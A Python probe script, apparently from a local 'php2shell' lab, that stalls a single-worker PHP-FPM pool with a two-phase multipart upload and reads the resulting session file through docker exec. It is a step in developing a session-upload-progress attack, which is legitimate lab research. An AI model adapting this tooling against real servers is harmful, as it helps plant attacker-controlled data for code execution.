#!/usr/bin/env python3
"""Probe the FPM session file during the upload-progress stall.

The FPM pool has one worker, so an in-band check_progress.php request cannot
run while the upload holds the worker. We read the session file with
`docker exec` instead.
"""
import argparse
import socket
import subprocess
import threading
import time
import uuid

from fpm_trigger import build


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, default=8090)
    ap.add_argument("--container", default="php2shell-lab-vuln-fpm-1")
    ap.add_argument("--path", default="/progress.php")
    ap.add_argument("--stall", type=float, default=5.0)
    a = ap.parse_args()

    sid = "php2shell" + uuid.uuid4().hex[:20]
    phase1, phase2, boundary = build(sid)
    body_len = len(phase1) + len(phase2)
    head = (
        f"POST {a.path} HTTP/1.1\r\n"
        f"Host: 127.0.0.1\r\n"
        f"Cookie: PHPSESSID={sid}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
        f"Content-Length: {body_len}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()

    s = socket.create_connection(("127.0.0.1", a.port), timeout=30)
    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    s.sendall(head + phase1)
    print(f"sid={sid} phase1 sent ({len(phase1)} bytes)")

    def probe():
        time.sleep(1.0)
        for i in range(3):
            r = subprocess.run(
                ["docker", "exec", a.container, "sh", "-c",
                 f"ls -la /tmp/sess_{sid}; echo ---; cat /tmp/sess_{sid}"],
                capture_output=True, text=True)
            print(f"--- probe {i + 1} ---")
            print(r.stdout.strip())
            print(r.stderr.strip())
            time.sleep(1.0)

    t = threading.Thread(target=probe)
    t.start()
    time.sleep(a.stall)
    s.sendall(phase2)
    print(f"phase2 sent ({len(phase2)} bytes)")
    t.join()
    s.settimeout(5)
    try:
        resp = s.recv(65536)
        print("response:", resp.split(b"\r\n", 1)[0].decode("latin1", "replace"))
    except OSError:
        print("no response")
    s.close()


if __name__ == "__main__":
    main()
